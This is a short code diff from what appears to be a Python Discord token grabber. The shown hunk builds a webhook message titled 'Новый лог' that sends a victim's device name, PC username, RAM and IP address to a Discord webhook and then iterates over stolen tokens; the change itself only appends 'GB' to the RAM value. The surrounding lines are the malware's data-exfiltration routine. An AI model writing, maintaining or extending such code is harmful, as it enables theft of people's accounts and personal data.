@@ -151,7 +151,7 @@ def start():
         embed.set_title(title="Новый лог")
         embed.add_field(name="\u200b", value=f'```fix\nDevice: {device_name}' +
                                              f'\nPC Username: {username}' +
-                                             f'\nRAM: {ram}' +
+                                             f'\nRAM: {ram}GB' +
                                              f'\nIP: {ip}```', inline=True)
         discord_webhook.add_embed(embed=embed)
         for token, info in tokens.items():
